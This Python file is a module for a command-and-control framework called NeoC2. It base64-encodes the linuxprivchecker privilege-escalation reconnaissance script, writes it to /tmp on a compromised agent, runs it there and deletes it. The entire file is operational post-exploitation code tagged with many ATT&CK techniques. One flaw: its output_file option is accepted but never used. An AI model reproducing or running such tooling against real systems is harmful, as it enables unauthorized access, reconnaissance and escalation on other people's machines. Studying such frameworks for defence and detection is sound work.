# modules/linuxprivchecker.py
import os
import re
import base64


def get_info():
    return {
        "name": "linuxprivchecker",
        "description": "Execute linuxprivchecker.py script for comprehensive Linux privilege escalation reconnaissance",
        "type": "privesc",
        "platform": "linux",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/sleventyeleven/linuxprivchecker"],
        "technique_id": "T1068,T1087.001,T1083,T1133,T1592,T1033,T1016,T1049,T1082,T1124,T1057,T1069,T1147,T1548,T1574,T1053,T1543,T1080,T1530,T1621,T1078",  # Exploitation for Privilege Escalation, Account Discovery (Local), File and Directory Discovery, External Remote Services, Gather Victim Host Information, System Owner/User Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Information Discovery, System Time Discovery, Process Discovery, Permission Groups Discovery, Hidden Files and Directories, Abuse Elevation Control Mechanism, Hijack Execution Flow, Scheduled Task/Job, Create or Modify System Process, Taint Shared Content, Data from Information Repositories, Deploy Client, Valid Accounts
        "mitre_tactics": ["Privilege Escalation", "Discovery", "Persistence", "Execution", "Defense Evasion"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run linuxprivchecker on",
                "required": True
            },
            "output_file": {
                "description": "File to output results (default: privcheckout.txt)",
                "required": False,
                "default": "privcheckout.txt"
            }
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    output_file = options.get("output_file", "privcheckout.txt")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    # Validate inputs
    if not re.match(r'^[a-zA-Z0-9_\-\.\/]+$', output_file):
        return {
            "success": False,
            "error": f"Invalid output_file: {output_file}. Contains invalid characters."
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    
    # Build the linuxprivchecker command based on options
    try:
        # Create a temporary location for the script
        temp_script_path = f"/tmp/linuxprivchecker.py"
        
        # linuxprivchecker script content (from the existing file in modules/linux/)
        # Since this module file is in the main modules directory, not in modules/linux/
        linuxprivchecker_script_path = os.path.join(os.path.dirname(__file__), 'linux', 'linuxprivchecker.py')
        try:
            with open(linuxprivchecker_script_path, 'r', encoding='utf-8') as f:
                linuxprivchecker_script_content = f.read()
        except FileNotFoundError:
            return {
                "success": False,
                "error": f"Could not find linuxprivchecker script at {linuxprivchecker_script_path}"
            }
        except Exception as e:
            return {
                "success": False,
                "error": f"Error reading linuxprivchecker script: {str(e)}"
            }
        
        # Encode the script content in base64 to transfer it
        script_b64 = base64.b64encode(linuxprivchecker_script_content.encode()).decode()
        
        # Build command to transfer and execute the script
        linuxprivchecker_cmd = f"echo '{script_b64}' | base64 -d > {temp_script_path} && "
        
        # Build the linuxprivchecker execution command with parameters
        linuxprivchecker_exec = f"python3 {temp_script_path}"
        
        # The linuxprivchecker.py script writes to privcheckout.txt by default
        # We'll let it run and then clean up
        
        linuxprivchecker_cmd += f"{linuxprivchecker_exec} ; rm {temp_script_path}"
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Error building linuxprivchecker command: {str(e)}"
        }
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, linuxprivchecker_cmd)
        if task_id:
            result = {
                "success": True,
                "output": f"LinuxPrivChecker task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "options_used": {
                    "output_file": output_file
                }
            }
            
            # Add additional info about where to find results
            result["output"] += f"\nResults will be saved to privcheckout.txt in the current directory. Check back for results."
            
            return result
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }
